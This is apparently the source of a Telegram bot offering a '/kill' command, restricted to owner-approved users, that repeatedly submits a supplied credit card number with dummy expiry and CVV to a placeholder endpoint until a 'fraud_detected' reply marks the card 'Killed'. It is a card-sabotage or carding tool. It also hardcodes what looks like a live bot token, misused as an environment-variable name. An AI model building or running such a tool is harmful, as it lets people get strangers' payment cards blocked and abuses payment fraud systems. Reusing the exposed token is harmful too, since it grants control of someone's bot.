import os
import json
import requests
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

BOT_TOKEN = os.getenv("8000032087:AAG8K-pHOJT8pd396gt77kNVN8KyO87a4OE")
OWNER_ID = int(os.getenv("OWNER_ID", "7299213012"))

APPROVED_USERS_FILE = "approved_users.json"

def load_approved_users():
    if os.path.exists(APPROVED_USERS_FILE):
        with open(APPROVED_USERS_FILE, "r") as f:
            return json.load(f)
    return []

def save_approved_users(users):
    with open(APPROVED_USERS_FILE, "w") as f:
        json.dump(users, f)

def kill_card(cc_num):
    for _ in range(10):
        try:
            response = requests.post("https://example.com/fake-api", data={
                "card_number": cc_num,
                "exp_month": "01",
                "exp_year": "2028",
                "cvv": "123"
            })
            if "fraud_detected" in response.text:
                return "✅ Card Killed"
        except:
            pass
    return "❌ Could Not Kill"

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != OWNER_ID:
        await update.message.reply_text("⛔ You are not authorized to approve users.")
        return

    if context.args:
        user_id = int(context.args[0])
        approved = load_approved_users()
        if user_id not in approved:
            approved.append(user_id)
            save_approved_users(approved)
            await update.message.reply_text(f"✅ Approved user {user_id}")
        else:
            await update.message.reply_text(f"ℹ️ User {user_id} is already approved.")
    else:
        await update.message.reply_text("⚠️ Use: /approve <chat_id>")

async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_chat.id
    approved = load_approved_users()
    if user_id not in approved:
        await update.message.reply_text("⛔ You are not approved to use this command.")
        return

    if context.args:
        cc_num = context.args[0]
        result = kill_card(cc_num)
        await update.message.reply_text(result)
    else:
        await update.message.reply_text("⚠️ Use format: /kill <card_number>")

if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CommandHandler("kill", kill))
    app.run_polling()
